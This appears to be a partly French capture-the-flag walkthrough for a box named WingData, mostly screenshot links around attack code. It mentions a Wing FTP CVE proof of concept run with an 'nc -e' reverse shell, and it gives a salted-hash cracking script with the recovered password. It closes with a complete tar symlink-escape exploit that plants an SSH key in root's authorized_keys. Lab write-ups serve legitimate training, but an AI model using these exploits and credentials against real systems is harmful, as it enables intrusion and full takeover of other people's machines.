---
aliases:
  - WingData
---
![[IMG-20260214235118941.png]]

![[IMG-20260214235520349.png]]

![[IMG-20260215000647247.png]]

 #### [CVE-2025-47812](https://github.com/4m3rr0r/CVE-2025-47812-poc)

![[IMG-20260215001439199.png]]
La première commande ne fonctionne pas car le PoC encapsule déjà automatiquement le payload entre quotes simples ('...').  
En ajoutant nous-mêmes des quotes (sh -c '...'), on casse la chaîne envoyée au serveur, donc la commande est mal interprétée et le reverse shell ne se lance pas (session expired).

La commande avec nc -e fonctionne car elle ne contient pas de quotes imbriquées et est exécutée correctement.

![[IMG-20260215001500951.png]]

![[IMG-20260215004235214.png]]

![[IMG-20260215004253856.png]]

```
Salt:WingFTP
Hash:32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

crack.py:
```python
import hashlib  
  
target = "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca"  
salt = "WingFTP"  
  
def sha256(s):  
return hashlib.sha256(s.encode()).hexdigest()  
  
with open("/opt/lists/rockyou.txt", "rb") as f:  
for line in f:  
pw = line.strip().decode(errors="ignore")  
  
if sha256(pw + salt) == target:  
print("[+] FOUND:", pw, "(pw+salt)")  
break  
  
if sha256(salt + pw) == target:  
print("[+] FOUND:", pw, "(salt+pw)")  
break
```

![[IMG-20260215004423130.png]]

```
wacky:!#7Blushing^*Bride5
```

![[IMG-20260215004507026.png]]

![[IMG-20260215021129585.png]]

![[IMG-20260215021148065.png]]


![[IMG-20260215022815066.png]]

![[IMG-20260215022931852.png]]

![[IMG-20260215022951810.png]]

```python
import tarfile
import os
import io

pub = open("/tmp/pwn.pub", "rb").read()
out = "/opt/backup_clients/backups/backup_9999.tar"

# Long directory name used to build a deep path structure
comp = "d" * 247

# Symlink chain steps
steps = "abcdefghijklmnop"
path = ""

with tarfile.open(out, "w") as tar:

    # Create nested directories + symlinks (a -> comp, b -> comp, ...)
    for i in steps:
        d = tarfile.TarInfo(os.path.join(path, comp))
        d.type = tarfile.DIRTYPE
        tar.addfile(d)

        s = tarfile.TarInfo(os.path.join(path, i))
        s.type = tarfile.SYMTYPE
        s.linkname = comp
        tar.addfile(s)

        path = os.path.join(path, comp)

    # Create a long symlink path inside the a/b/c/... chain
    linkpath = os.path.join("/".join(steps), "l" * 254)

    # Symlink that goes back up inside the extraction directory
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps)
    tar.addfile(l)

    # Symlink pointing (after resolution) outside the destination directory
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../../root/.ssh"
    tar.addfile(e)

    # Write authorized_keys through the escape symlink
    f = tarfile.TarInfo("escape/authorized_keys")
    f.type = tarfile.REGTYPE
    f.mode = 0o600
    f.size = len(pub)
    tar.addfile(f, fileobj=io.BytesIO(pub))

print("[+] written:", out)

```

![[IMG-20260215212040805.png]]


![[IMG-20260215014201690.png]]